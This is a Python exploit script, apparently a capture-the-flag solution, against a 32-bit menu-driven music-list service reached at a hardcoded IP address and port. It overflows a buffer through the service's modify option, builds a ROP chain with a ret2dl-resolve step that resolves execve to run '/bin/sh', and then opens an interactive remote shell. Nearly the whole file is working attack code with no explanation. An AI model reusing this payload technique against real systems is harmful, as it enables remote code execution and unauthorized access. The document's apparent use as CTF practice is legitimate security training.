#!/usr/bin/env python
from sc_pwn import *

#target     = {'host':'192.168.75.129','port':8080}
target     = {'host':'175.119.158.133','port':9091}

addr_plt_reloc  = 0x080484e0
addr_plt_read   = 0x080484f0
addr_got_puts   = 0x0804c028
addr_pop_x3     = 0x080495ad    # pop ebx ; pop edi ; pop ebp ; ret

addr_relplt     = 0x08048440
addr_dynsym     = 0x080481d8
addr_dynstr     = 0x080482f8
addr_version    = 0x080483c2
addr_bss        = 0x0804cb60

addr_buf        = addr_bss + 0x30 + 0x190
str_sh          = '/bin/sh\x00'

#==========
def attack(cmn):
    cmn.read_until('name : \n')
    cmn.sendln('hoge')
    
    Add(cmn,'\n','\n')

    dl = DLresolve('x86',addr_dynsym, addr_dynstr, addr_relplt, addr_version)
    dl.set_funcadr(addr_got_puts, 'execve')
    dlr = dl.resolve(addr_buf+len(str_sh))
    
    exploit  = '\x00'*0xc
    exploit += pack_32(addr_plt_read)
    exploit += pack_32(addr_pop_x3)
    exploit += pack_32(STDIN_FILENO)
    exploit += pack_32(addr_buf)
    exploit += pack_32(len(str_sh + dlr))
    exploit += pack_32(addr_plt_reloc)
    exploit += pack_32(dl.offset('execve'))
    exploit += pack_32(0xdeadbeef)
    exploit += pack_32(addr_buf)
    exploit += pack_32(NULL)
    exploit += pack_32(NULL)
    
    Modify(cmn, 101, exploit[:0x14], exploit[0x14:] if len(exploit)>0x14 else '\n')

    cmn.read_until('select\t|\t\n')
    cmn.sendln('4')

    cmn.send(str_sh + dlr)

def Add(cmn, music, artist):
    cmn.read_until('select\t|\t\n')
    cmn.sendln('1')
    cmn.read_until('music\t|\t')
    cmn.send(music)
    cmn.read_until('artist\t|\t')
    cmn.send(artist)

def Modify(cmn, num, music, artist):
    cmn.read_until('select\t|\t\n')
    cmn.sendln('3')
    cmn.read_until('number\t|\t\n')
    cmn.sendln(str(num))
    cmn.read_until('music\t|\t')
    cmn.send(music)
    cmn.read_until('artist\t|\t')
    cmn.send(artist)

#==========

if __name__=='__main__':
    cmn = Communicate(target,mode='RAW')
    attack(cmn)

    sh = Shell(cmn)
    sh.select()
    del(sh)
    
    del(cmn)
    
#==========
